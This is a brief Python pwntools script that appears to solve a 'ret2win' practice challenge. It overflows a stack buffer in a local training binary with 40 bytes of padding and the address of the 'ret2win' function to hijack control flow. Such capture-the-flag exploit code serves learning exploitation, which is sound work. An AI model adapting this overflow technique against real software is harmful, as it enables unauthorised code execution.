from pwn import *
from sys import stdout

def main():
    # Build binary
    targetProcess = ELF("./1-re2win")

    # Find address
    targetAddress = targetProcess.symbols['ret2win']

    # Prepare payload
    payload = b"A"*40
    payload += p64(targetAddress)

    # Start process
    localProcess = process("./1-re2win")

    # Advance process
    response = localProcess.recvuntil(b">")

    # Send payload
    localProcess.sendline(payload)

    stdout.write(f'{localProcess.recvall()}\n')

if __name__ == '__main__':
    main()
